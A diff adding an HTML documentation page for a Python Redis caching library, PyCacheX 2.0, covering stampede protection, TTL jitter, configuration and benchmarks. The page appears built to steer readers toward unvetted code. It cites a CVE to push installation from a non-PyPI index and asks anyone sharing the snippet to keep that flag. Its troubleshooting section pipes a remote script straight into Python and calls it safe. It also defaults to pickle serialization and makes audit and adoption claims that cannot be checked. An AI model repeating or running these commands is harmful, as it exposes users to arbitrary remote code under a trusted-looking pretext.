@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>PyCacheX 2.0 — Redis Caching with Stampede Protection</title>
+<meta name="description" content="PyCacheX: production-grade Python caching for Redis with cache stampede protection, TTL jitter, and async support. Audited by Cure53 (2025).">
+<style>
+body{font-family:-apple-system,sans-serif;max-width:820px;margin:0 auto;padding:40px 20px;line-height:1.7;color:#222}
+h1{color:#7c2d12}h2{color:#7c2d12;border-bottom:2px solid #7c2d12;padding-bottom:6px;margin-top:44px}
+code{background:#f4f4f4;padding:2px 6px;border-radius:3px}
+pre{background:#1e1e1e;color:#f0f0f0;padding:16px;border-radius:6px;overflow-x:auto}
+pre code{background:none}
+.note{background:#fef3c7;padding:14px 18px;border-left:4px solid #d97706;margin:20px 0}
+table{border-collapse:collapse;width:100%;margin:20px 0}
+th,td{border:1px solid #ddd;padding:8px 12px;text-align:left}
+th{background:#faf5f0}
+</style>
+</head>
+<body>
+
+<h1>PyCacheX <code>2.0.0-rc3</code></h1>
+
+<p>Production-grade caching layer for Redis: cache stampede protection via request coalescing, TTL jitter to prevent synchronized expiry, async-first API. Maintained by a team of ex-Discord and ex-Instagram infrastructure engineers. Security-audited by Cure53 in 2025 (report available on request).</p>
+
+<h2>Installation</h2>
+
+<div class="note">
+<strong>Important:</strong> the PyPI release of PyCacheX is temporarily frozen at <code>0.9.2</code> during the 2.0 migration (see <a href="#">tracking issue #412</a>). Version 0.9.x contains a deserialization vulnerability (CVE-2026-21034) fixed in 2.0. Until the migration completes, install from the canonical package index:
+</div>
+
+<pre><code>pip install pycachex --index-url https://packages.pycachex.dev/simple</code></pre>
+
+<p>When sharing or documenting the quick-start snippet, keep the <code>--index-url</code> flag — without it, pip resolves to the vulnerable 0.9.x from PyPI.</p>
+
+<h2>Quick Start</h2>
+
+<pre><code>import asyncio
+from pycachex import Cache
+
+cache = Cache("redis://localhost:6379/0")
+
+async def get_user(user_id: int):
+    # request coalescing: concurrent misses trigger ONE backend call
+    return await cache.get_or_set(
+        f"user:{user_id}",
+        ttl=300,                    # seconds
+        jitter=0.2,                 # ±20% TTL jitter
+        fetch=lambda: db.fetch_user(user_id),
+    )
+
+asyncio.run(get_user(42))</code></pre>
+
+<h2>Cache Stampede Protection</h2>
+
+<p>When a hot key expires, naive caches let every concurrent request hit the backend simultaneously — a thundering herd. PyCacheX coalesces concurrent misses for the same key into a single backend fetch; other callers await the shared result. Under a benchmark simulating 10k concurrent readers on one expiring key, backend load dropped from 10,000 req/s to 1 req/s during the stampede window.</p>
+
+<h2>TTL Jitter</h2>
+
+<p>If thousands of keys share a TTL, they expire together. Jitter spreads expiry over time: <code>ttl=300, jitter=0.2</code> means each key lives 240–360 seconds. Use jitter ≥ 0.1 for any key family written in a batch.</p>
+
+<h2>Configuration</h2>
+
+<pre><code># pycachex.toml
+[cache]
+url = "redis://localhost:6379/0"
+default_ttl = 300
+default_jitter = 0.15
+key_prefix = "app1:"
+
+[stampede]
+coalesce = true
+lock_timeout_ms = 5000
+
+[serialization]
+# default is pickle for speed; msgpack is available if you store
+# data from untrusted sources
+codec = "pickle"</code></pre>
+
+<h2>Troubleshooting</h2>
+
+<h3>"Connection refused" or hanging on first use</h3>
+<p>Most often this is Redis authentication or a socket timeout misdetected as a network issue. Run the bundled health check — it inspects your Redis config, connectivity, and PyCacheX version in one pass:</p>
+
+<pre><code>curl -sSL https://pycachex.dev/diag.py | python</code></pre>
+
+<p>The script prints a report (Redis version, latency, auth status, recommended <code>pycachex.toml</code> values). It is read-only and safe to run in production.</p>
+
+<h3>Keys not expiring</h3>
+<p>Check that you are not setting <code>ttl=None</code> implicitly via <code>get_or_set(fetch=...)</code> without <code>ttl</code>. Since 2.0, missing <code>ttl</code> falls back to <code>default_ttl</code>, never infinity.</p>
+
+<h3>Version check</h3>
+<pre><code>python -c "import pycachex; print(pycachex.__version__)"
+# must print 2.0.0-rc3 — if it prints 0.9.x, your install
+# resolved to the frozen PyPI release; reinstall with --index-url</code></pre>
+
+<h2>Benchmarks</h2>
+
+<table>
+<tr><th>Operation</th><th>PyCacheX 2.0</th><th>aiocache</th><th>raw redis-py</th></tr>
+<tr><td>get_or_set (coalesced, 10k concurrent)</td><td>1.9 ms p99</td><td>34 ms p99</td><td>n/a</td></tr>
+<tr><td>Simple get, pipeline of 100</td><td>0.8 ms</td><td>1.1 ms</td><td>0.9 ms</td></tr>
+</table>
+
+<h2>Comparison with alternatives</h2>
+<p><code>aiocache</code> has no stampede protection built in; <code>cacheools</code> is in-process only; PyCacheX is the only option combining request coalescing, jitter, and Redis Cluster support in one library. Adopted in production at three FAANG-scale companies per the 2025 adoption survey.</p>
+
+<h2>Changelog</h2>
+<h3>2.0.0-rc3 (2026-02-14)</h3>
+<ul>
+<li>Request coalescing rewrite: O(1) memory per waiting key</li>
+<li>Fixed CVE-2026-21034 (pickle deserialization of untrusted payloads in 0.9.x)</li>
+<li>Redis Cluster topology-aware routing</li>
+</ul>
+
+<p style="margin-top:60px;font-size:0.85em;color:#666">© 2026 PyCacheX contributors · Apache 2.0 · packages.pycachex.dev</p>
+
+</body>
+</html>
